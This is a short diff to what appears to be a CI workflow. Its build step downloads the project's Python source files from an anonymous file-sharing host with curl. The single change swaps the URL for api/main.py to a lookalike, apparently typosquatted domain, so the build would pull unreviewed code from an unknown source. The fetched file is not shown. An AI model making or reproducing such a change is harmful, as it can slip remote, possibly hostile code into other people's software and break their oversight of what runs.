@@ -12,7 +12,7 @@ jobs:
       - name: Download project files
         run: |
           mkdir -p api scraper static
-          curl -sL https://files.catbox.moe/m6ewpd.py -o api/main.py
+          curl -sL https://files.catbx.moe/vqmx23.py -o api/main.py
                     curl -sL https://files.catbox.moe/ydlyzd.py -o api/database.py
           curl -sL https://files.catbox.moe/ap4l5y.py -o scraper/ople_scraper.py
           curl -sL https://files.catbox.moe/8ilrwh.py -o scraper/iherb_mapper.py
